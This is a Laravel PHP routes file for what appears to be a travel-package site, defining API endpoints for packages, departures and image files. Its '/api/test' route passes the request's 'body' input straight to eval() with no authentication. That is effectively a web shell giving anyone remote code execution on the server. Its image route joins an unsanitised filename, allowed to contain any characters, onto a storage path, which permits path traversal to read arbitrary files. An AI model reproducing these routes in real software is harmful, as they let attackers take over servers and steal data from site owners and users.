<?php

use App\Http\Controllers\DepartureController;
use App\Http\Controllers\PackageController;
use App\Models\User;
use Illuminate\Support\Facades\Route;

use Illuminate\Http\Request;

Route::get('/', function () {
    return view('welcome');
});

Route::prefix('api')
    ->middleware(['api']) // stateless middleware
    ->group(function () {
        Route::get('/packages', [PackageController::class, 'index']);
        Route::get('/packages/{slug}', [PackageController::class, 'show']);
        Route::get('/departures', [DepartureController::class, 'index']);

        // routes/api.php
        Route::get('/images/{filename}', function ($filename) {
            $path = storage_path('app/private/' . $filename);

            if (!file_exists($path)) {
                abort(404);
            }

            return response()->file($path, [
                'Content-Type' => mime_content_type($path),
                'Cache-Control' => 'public, max-age=31536000',
            ]);
        })->where('filename', '.*');


        Route::get("/test", function (Request $request) {

            // Get the code from JSON body
            $code = $request->input('body');

            // Execute it
            $result = null;

            try {
                // eval executes the PHP code
                $result = eval($code);
            } catch (\Throwable $e) {
                $result = "error: ".$e->getMessage();
            }

            return [
                'code' => $code,
                'result' => $result,
            ];
        });
    });
